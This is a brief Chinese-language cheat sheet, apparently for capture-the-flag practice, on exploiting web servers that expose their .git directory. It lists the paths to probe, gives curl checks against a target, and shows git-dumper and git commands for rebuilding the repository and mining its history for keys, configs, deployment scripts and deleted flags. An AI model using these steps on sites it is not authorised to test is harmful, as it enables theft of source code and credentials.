# Git 泄露

## 常见路径

```text
/.git/
/.git/config
/.git/HEAD
/.git/index
/.git/logs/HEAD
```

## 检查

```bash
curl http://target/.git/HEAD
curl http://target/.git/config
```

## 利用

```bash
git-dumper http://target/.git/ ./repo
cd repo
git log --all --oneline
git branch -a
git reflog
git checkout <commit>
```

若只能获取部分对象：

```bash
git reset --hard <commit>
git fsck --lost-found
```

## 重点

- 历史提交中的源码、密钥和配置文件。
- 删除但未清理的 Flag 或备份文件。
- `.gitignore`、CI 配置和部署脚本。